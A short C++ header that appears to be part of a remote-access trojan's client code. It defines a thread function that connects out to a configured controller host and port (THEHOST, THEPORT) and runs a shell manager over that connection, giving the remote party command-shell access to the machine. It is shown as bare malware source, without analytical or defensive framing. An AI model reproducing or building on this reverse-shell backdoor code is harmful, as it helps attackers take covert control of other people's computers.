#ifndef FUNCTIONTHREAD_H
#define FUNCTIONTHREAD_H


#include "KernelManager.h"
#include "ShellManager.h"



DWORD WINAPI ShellManagerThread(LPVOID lparam)
{   
	CKernelManager* pThis=(CKernelManager*)lparam;
	CClient	client;
	if (client.Connect(THEHOST, THEPORT)<0) {
		printf("connect error!\n");
		exit(-1);
	}
	CShellManager	manager(&client);
    manager.m_id=pThis->m_id;
	manager.WaitEvent();
	Sleep(3000);

	printf("quited!!\n");
	
	pThis->m_hThread[COMMAND_SHELL-2]=NULL;
	pThis->m_nThreadCount--;
	return 0;
}



#endif